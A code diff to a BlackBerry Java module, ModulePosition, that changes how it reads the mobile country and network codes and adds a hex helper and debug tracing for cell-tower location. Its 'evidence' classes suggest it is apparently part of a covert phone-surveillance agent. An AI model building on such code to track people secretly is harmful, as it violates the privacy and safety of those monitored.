@@ -30,13 +30,13 @@ import blackberry.Status;
 import blackberry.config.Conf;
 import blackberry.config.ConfModule;
 import blackberry.config.ConfigurationException;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceType;
 import blackberry.location.LocationHelper;
 import blackberry.location.LocationObserver;
-import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 
@@ -238,13 +238,21 @@ public final class ModulePosition extends BaseInstantModule implements
             // http://en.wikipedia.org/wiki/Mobile_Network_Code
             final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();
 
-            final int mcc = Integer.parseInt(Integer.toHexString(cellinfo
-                    .getMCC()));
+            //#ifdef DEBUG
+            debug.trace("mcc: " + cellinfo.getMCC() + "/"
+                    + GPRSInfo.getHomeMCC());
+            /*Evidence.info("mcc cellinfo=" + cellinfo.getMCC() + " homeMCC="
+                    + GPRSInfo.getHomeMCC() + " radioninfo="
+                    + RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex())
+                    + " mnc=" + cellinfo.getMNC() + " radiomnc="
+                    + RadioInfo.getMNC(RadioInfo.getCurrentNetworkIndex()));*/
+            //#endif
 
-            final int mnc = cellinfo.getMNC();
+            int mcc = hex(RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex()));
+            int mnc = RadioInfo.getMNC(RadioInfo.getCurrentNetworkIndex());
+            
             final int lac = cellinfo.getLAC();
             final int cid = cellinfo.getCellId();
-
             final int bsic = cellinfo.getBSIC();
 
             //final int rssi = cellinfo.getRSSI();
@@ -305,6 +313,10 @@ public final class ModulePosition extends BaseInstantModule implements
             //#endif
         }
 
+    }
+
+    private int hex(int value) {
+        return Integer.parseInt(Integer.toHexString(value));
     }
 
     public synchronized void newLocation(Location loc) {
